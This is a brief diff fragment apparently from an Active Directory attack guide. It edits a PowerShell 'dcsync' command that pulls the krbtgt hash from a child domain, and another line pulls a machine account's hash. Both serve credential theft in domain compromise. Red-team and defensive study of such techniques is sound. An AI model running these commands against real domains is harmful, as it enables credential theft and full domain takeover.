@@ -3,7 +3,7 @@
 
 Obtain krbtgt hash and machine account hash
 ```powershell
-dcsync contoso.com CONTOSO\krbtgt
+dcsync dublin.contoso.com DUBLIN\krbtgt
 
 dcsync contoso.com CONTOSO\lon-db-1$
 
